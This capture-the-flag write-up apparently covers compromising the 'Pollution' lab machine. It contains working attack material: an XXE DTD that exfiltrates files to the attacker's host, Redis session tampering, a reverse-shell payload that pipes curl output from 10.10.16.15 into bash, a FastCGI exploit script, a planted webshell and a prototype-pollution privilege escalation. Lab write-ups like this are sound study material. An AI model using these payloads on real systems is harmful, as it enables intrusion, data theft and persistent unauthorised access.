# Pollution

---

## Enumeration

- nmap TCP Scan:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db1d5c65729bc64330a52ba0f01ad5fc (RSA)
|   256 4f7956c5bf20f9f14b9238edcefaac78 (ECDSA)
|_  256 df47554f4ad178a89dcdf8a02fc0fca9 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Home
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Found `forum` and `developers` subdomain using `wfuzz`
- In the `forum` subdomain, found a username `administrator_forum` which is forum admin
- `Victor, Sysadmin, Jane, karldev, jeorge, lyon` are forum users
- Users talking about `kubernetes`
- Found file `proxy_history.txt` that has some requests and responses that reveals some API calls!
- Found `/set/role/admin` API call, with `token=ddac62a28254561001277727cb397baf` in POST body
- Upgraded my user to admin
- On registering a new user to the API, I intercepted the request:

```
POST /api HTTP/1.1
Host: collect.htb
Content-Length: 171
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://collect.htb
Referer: http://collect.htb/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=r8m0cvosgs95j34ckkh20dcuca
Connection: close

manage_api=<?xml version="1.0" encoding="UTF-8"?><root><method>POST</method><uri>/auth/register</uri><user><username>test</username><password>test</password></user></root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
	<method>POST</method>
	<uri>/auth/register</uri>
	<user>
		<username>test</username>
		<password>test</password>
	</user>
</root>
```

- Changed uri to `/auth/login` and got `x-access-token`:

```json
{
	"Status":"Ok",
	"Header": {
		"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjcwMjQ1NzE2LCJleHAiOjE2NzAyNDkzMTZ9.CK7CXoHY245Y1fNS31tvqQvy774HfCBfqgTIWCzPblk"
	}
}
```

- Leaked API Docs from `/documentation`

---

## Foothold

- This API call is vulnerable to XXE
- Read files via blind SSRF - exfiltrate data out-of-band using a malicious dtd file
- dtd file:

```
<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=/etc/hostname'>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.16.15/?x=%file;'>">
%eval;
%exfiltrate;
```

- Sent the following API call to the server and got the contents of file `/etc/hostname` which is `pollution`

```
POST /api HTTP/1.1
Host: collect.htb
Content-Length: 269
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://collect.htb
Referer: http://collect.htb/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=r8m0cvosgs95j34ckkh20dcuca
Connection: close

manage_api=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.16.15/evil.dtd"> %xxe;]>
<root>
	<method>POST</method>
	<uri>/auth/login</uri>
	<user>
		<username>test</username>
		<password>test</password>
	</user>
</root>
```

- Data received on a simple python http server:

```
10.129.105.217 - - [05/Dec/2022 08:52:21] "GET /evil.dtd HTTP/1.1" 200 -
10.129.105.217 - - [05/Dec/2022 08:52:22] "GET /?x=cG9sbHV0aW9uCg== HTTP/1.1" 200 -
```

- base64 decode:

```bash
echo 'cG9sbHV0aW9uCg==' | base64 -d

pollution
```

- read `../bootstrap.php`

```
echo 'PD9waHAKaW5pX3NldCgnc2Vzc2lvbi5zYXZlX2hhbmRsZXInLCdyZWRpcycpOwppbmlfc2V0KCdzZXNzaW9uLnNhdmVfcGF0aCcsJ3RjcDovLzEyNy4wLjAuMTo2Mzc5Lz9hdXRoPUNPTExFQ1RSM0QxU1BBU1MnKTsKCnNlc3Npb25fc3RhcnQoKTsKCnJlcXVpcmUgJy4uL3ZlbmRvci9hdXRvbG9hZC5waHAnOwo=' | base64 -d


<?php
ini_set('session.save_handler','redis');
ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');

session_start();

require '../vendor/autoload.php';
```

- quick nmap scan

```shell
nmap -p 6379 $IP                                        

PORT     STATE SERVICE
6379/tcp open  redis
```

- Redis password: `COLLECTR3D1SPASS`
- Interesting findings: nothing really useful so far

```
10.129.105.217:6379[2]> SELECT 0
OK
10.129.105.217:6379> KEYS *
1) "PHPREDIS_SESSION:r8m0cvosgs95j34ckkh20dcuca"
```

- Found `PHPREDIS_SESSION` and after some googling, I found that you can control PHP sessions through a redis server
- I kept enumerating files using the XXE vulnerability and got the developers `.htpasswd` file. cracked the password
- `developers_group:r0cket`
- Now I modified the PHPREDIS_SESSION to give myself admin access to the website:

```
10.129.103.183:6379> SET PHPREDIS_SESSION:8ep08cag4vhgmaqkfdrj0h9mrh "username|s:4:\"test\";role|s:5:\"admin\";auth|s:4:\"True\";"
OK
10.129.103.183:6379> get PHPREDIS_SESSION:8ep08cag4vhgmaqkfdrj0h9mrh
"username|s:3:\"foo\";role|s:5:\"admin\";auth|s:4:\"True\";"
```

- Upon loading `http://developers.collect.htb` I got redirected to `/page=home`
- Used RCE through PHP filters: https://github.com/synacktiv/php_filter_chain_generator
- Got revshell as `www-data`
- Payload: ```<?=`curl 10.10.16.15/r -o - | bash`?>```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.15] from (UNKNOWN) [10.129.104.107] 45908
bash: cannot set terminal process group (959): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pollution:~/developers$ which python3
which python3
/usr/bin/python3
www-data@pollution:~/developers$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ers$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@pollution:~/developers$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg             
[1]  + continued  nc -lvnp 1337

www-data@pollution:~/developers$ export TERM=xterm-256color
www-data@pollution:~/developers$ stty rows 39 cols 157
www-data@pollution:~/developers$ 

```

- Planted a webshell backdoor in `forum` in case I lose my shell

---

## Lateral Movement

- collect config.php:

```php
www-data@pollution:~/collect$ cat config.php 
<?php


return [
    "db" => [
        "host" => "localhost",
        "dbname" => "webapp",
        "username" => "webapp_user",
        "password" => "Str0ngP4ssw0rdB*12@1",
        "charset" => "utf8"
    ],
];
```

- All hashes in the database are not crackable
- Found open port 9000

```bash
www-data@pollution:~/forum$ ss -tulpn | grep tcp | grep LISTEN
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      511        127.0.0.1:3000       0.0.0.0:*          
tcp   LISTEN 0      511        127.0.0.1:9000       0.0.0.0:*          
tcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:6379       0.0.0.0:*          
tcp   LISTEN 0      511                *:80               *:*          
tcp   LISTEN 0      128             [::]:22            [::]:*          
tcp   LISTEN 0      511            [::1]:6379          [::]:* 
```

- To elevate from www-data to victor: https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi

```bash
www-data@pollution:~/developers$ cat /tmp/wwwdata/poc.sh 
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/developers/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done

www-data@pollution:~/developers$ /tmp/wwwdata/poc.sh 127.0.0.1
Status: 302 Found
Set-Cookie: PHPSESSID=f4ma2c64hqtf9npu84g0eanrts; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login.php
Content-type: text/html; charset=UTF-8

victor
```

- To get revshell, executed the same revshell payload `curl 10.10.16.15/r -o - | bash`
- Got user.txt

```bash

nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.15] from (UNKNOWN) [10.129.104.107] 51570
bash: cannot set terminal process group (959): Inappropriate ioctl for device
bash: no job control in this shell
victor@pollution:/var/www/developers$ 
```
---

## Privilege Escalation

- Found `pollution-api` directory in Vctor's home
- JWT Secret: `JWT_COLLECT_124_SECRET_KEY`
- `Message_send.js` looks interesting
- Updated the mysql database -> pollution_api db -> updated my user's role to "admin"
- Got a new token with `role:admin`
- Forwarded port 3000 to my kali machine
- wrote `callAPI.py` script to play with the API and see what can I get out of it
- API is vulnerable to prototype pollution
- Wrote `callAPI.py` python script to exploit it using the payload `chmod +s /bun/bash`

```bash
victor@pollution:~/pollution_api$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
victor@pollution:~/pollution_api$ bash -p
bash-5.1# whoami
root

```

---
